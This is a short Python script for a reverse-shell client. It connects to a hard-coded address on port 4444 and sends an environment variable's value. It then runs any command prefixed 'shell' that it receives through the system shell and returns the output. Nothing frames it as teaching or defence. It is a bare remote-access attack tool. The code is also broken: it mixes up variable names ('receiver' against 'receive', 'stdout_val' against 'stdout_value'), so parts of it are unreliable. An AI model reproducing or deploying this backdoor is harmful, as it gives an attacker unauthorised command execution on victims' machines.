import socket, os, subprocess
def connect():
    os.system('cls')
    global host
    global port 
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 4444
    host = "10.42.0.243"
    try:
        print ( 'attempting to get a connection' )
        s.connect((host,port))
        s.send(os.environ['Scott'])
    except:
        print 'Connection failed'

def receive():
    receiver = s.recv(1024)
    if receive == 'quit':
        s.close()
    elif receive[0:5] == 'shell':
        proc2 = subprocess.Popen(receive[6:], shell= True, stdout= subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
        stdout_val = proc2.stdout.read() + proc2.stderr.read()
        args = stdout_value
    else:
        args = 'no valid input'
    send(args)

def send(args):
    send = s.send(args)
    receive()

connect()
receive()
s.close()


